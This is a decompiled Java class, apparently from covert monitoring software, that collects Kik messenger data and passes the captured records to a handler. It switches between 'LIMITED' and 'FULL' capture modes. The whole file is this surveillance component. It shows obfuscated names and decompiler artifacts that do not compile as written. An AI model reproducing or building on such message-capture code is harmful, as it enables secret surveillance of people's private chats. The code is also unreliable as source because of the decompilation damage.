package com.vvt.capture.kik;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.e;
  private com.vvt.base.b c;
  private com.vvt.base.a d;
  private String e;
  private com.vvt.base.capture.e f;
  private f g;
  
  public a(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, Context paramContext, com.vvt.base.b paramb1)
  {
    this.e = paramString;
    this.d = parama;
    this.c = paramb1;
    Object localObject1 = RunningMode.LIMITED_1;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      localObject1 = new com/vvt/capture/kik/b/a;
      localObject2 = this.c.f();
      ((com.vvt.capture.kik.b.a)localObject1).<init>(paramb, paramString, (String)localObject2);
      this.f = ((com.vvt.base.capture.e)localObject1);
      localObject1 = new com/vvt/capture/kik/b/b;
      localObject2 = this.c;
      ((com.vvt.capture.kik.b.b)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
      this.g = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.FULL;
      if (paramRunningMode == localObject1)
      {
        localObject1 = new com/vvt/capture/kik/a/b;
        ((com.vvt.capture.kik.a.b)localObject1).<init>();
        this.f = ((com.vvt.base.capture.e)localObject1);
        localObject1 = new com/vvt/capture/kik/a/e;
        localObject2 = this.c;
        ((com.vvt.capture.kik.a.e)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
        this.g = ((f)localObject1);
      }
      else
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.c = paramb;
    boolean bool = a;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof KikData;
      if (bool2)
      {
        bool2 = a;
        if (bool2) {}
        localObject = b.a((KikData)localObject);
        if (localObject != null)
        {
          int i = ((List)localObject).size();
          if (i > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.d;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = this.d;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected com.vvt.base.capture.e b()
  {
    return this.f;
  }
  
  protected f c()
  {
    return this.g;
  }
  
  protected String d()
  {
    return "KikCapture";
  }
  
  protected String e()
  {
    return this.e;
  }
  
  protected String f()
  {
    return "kik.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */